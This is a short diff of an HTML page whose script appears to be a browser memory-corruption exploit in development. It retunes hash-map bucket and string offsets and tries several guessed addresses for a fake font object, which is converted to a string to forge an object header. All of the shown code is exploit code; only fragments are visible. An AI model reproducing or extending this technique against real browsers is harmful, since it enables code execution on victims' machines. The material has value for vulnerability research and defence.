@@ -30,14 +30,17 @@ function stringToPtr(s, o) {
     return ans;
 }
 
-var HASHMAP_BUCKET = 0xB8;
+var HASHMAP_BUCKET = 0x80;
 var STRING_OFFSET  = 0x14;
 var string_id = 10000000;
 var strings = [];
 var keepAlive = [];
 
-var GUESS_FONT = 0x200430000;
-//var GUESS_FONT = 0x414141414141;
+//var GUESS_FONT = 0x200430000;
+//var GUESS_FONT = 0x20019afa0;
+//var GUESS_FONT = 0x200aecf00;
+//var GUESS_FONT = 0x200af0f00;
+var GUESS_FONT = 0xffffffff
 var p_s = ptrToString(GUESS_FONT);
 
 var fake_head = p_s.substr(0, 4)
@@ -196,3 +199,4 @@ window.onload = () => {
 </script>
 </body>
 </html>
+
